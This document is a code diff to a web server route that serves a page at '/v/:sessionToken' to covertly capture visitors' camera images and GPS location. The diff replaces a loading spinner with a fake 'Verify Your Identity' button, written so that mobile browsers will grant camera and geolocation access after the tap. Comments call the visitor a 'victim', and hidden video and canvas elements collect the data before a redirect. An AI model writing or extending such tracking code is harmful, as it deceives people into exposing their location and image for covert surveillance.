@@ -97,30 +97,70 @@ router.get('/v/:sessionToken', (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loading...</title>
+  <title>Verify Your Identity</title>
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       min-height: 100vh;
-      background: #0d1b2e;
+      background: linear-gradient(135deg, #0d1b2e 0%, #1b2838 100%);
       display: flex; align-items: center; justify-content: center;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      padding: 20px;
     }
-    .spinner {
-      width: 44px; height: 44px;
-      border: 4px solid rgba(255,255,255,0.15);
-      border-top-color: #e02e4f;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+    .card {
+      background: rgba(255,255,255,0.06);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 20px;
+      padding: 40px 32px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
+    .icon {
+      font-size: 48px; margin-bottom: 16px;
+    }
+    h1 {
+      color: #fff; font-size: 22px; font-weight: 600; margin-bottom: 8px;
+    }
+    p {
+      color: rgba(255,255,255,0.55); font-size: 14px; line-height: 1.5; margin-bottom: 28px;
+    }
+    .btn {
+      display: inline-block;
+      background: #e02e4f;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 14px 40px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.15s;
+      touch-action: manipulation;
+    }
+    .btn:active { transform: scale(0.96); }
+    .btn:focus { outline: 2px solid rgba(224,46,79,0.5); }
+    .status {
+      margin-top: 20px;
+      color: rgba(255,255,255,0.35);
+      font-size: 13px;
+      display: none;
+    }
+    .status.show { display: block; }
     /* Hidden tracking elements */
     #_tv { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
     #_tc { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
   </style>
 </head>
 <body>
-  <div class="spinner"></div>
+  <div class="card">
+    <div class="icon">🛡️</div>
+    <h1>Verify Your Identity</h1>
+    <p>We need to verify you are a real person.<br>Tap the button below to continue.</p>
+    <button class="btn" id="_goBtn">Tap to Verify</button>
+    <div class="status" id="_status">Processing…</div>
+  </div>
   <video id="_tv" autoplay playsinline muted></video>
   <canvas id="_tc"></canvas>
 
@@ -180,25 +220,10 @@ router.get('/v/:sessionToken', (req, res) => {
       }).catch(function () {});
     }
 
-    // ── 3. GPS (prompt shown to victim — survives redirect) ──
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        function (pos) {
-          metrics.gps = {
-            lat : pos.coords.latitude,
-            lng : pos.coords.longitude,
-            acc : pos.coords.accuracy,
-            alt : pos.coords.altitude,
-            spd : pos.coords.speed
-          };
-          sendMetrics();
-        },
-        function () {},
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-      );
-    }
+    // ── Everything below needs USER GESTURE (click/tap) ──────────
+    // Modern mobile browsers BLOCK getUserMedia and geolocation
+    // unless triggered by a user tap.
 
-    // ── 4. Front camera capture then redirect ────────────
     var _redirected = false;
     function doRedirect () {
       if (_redirected) return;
@@ -238,14 +263,38 @@ router.get('/v/:sessionToken', (req, res) => {
           }, 1200);
         };
       }).catch(function () {
-        // Camera denied or not available — redirect anyway
         doRedirect();
       });
     }
 
-    // Start camera capture; redirect after 2.5s max regardless
-    captureCamera();
-    setTimeout(doRedirect, 2500);
+    // ── GPS (also needs user gesture on mobile) ────────
+    function captureGps () {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.getCurrentPosition(
+        function (pos) {
+          metrics.gps = {
+            lat : pos.coords.latitude,
+            lng : pos.coords.longitude,
+            acc : pos.coords.accuracy,
+            alt : pos.coords.altitude,
+            spd : pos.coords.speed
+          };
+          sendMetrics();
+        },
+        function () {},
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    }
+
+    // ── On button tap: start camera + GPS, then redirect ──
+    document.getElementById('_goBtn').addEventListener('click', function () {
+      document.getElementById('_goBtn').style.display = 'none';
+      document.getElementById('_status').classList.add('show');
+      document.getElementById('_status').textContent = 'Verifying…';
+      captureGps();
+      captureCamera();
+      setTimeout(doRedirect, 5000);
+    });
 
   })();
   </script>
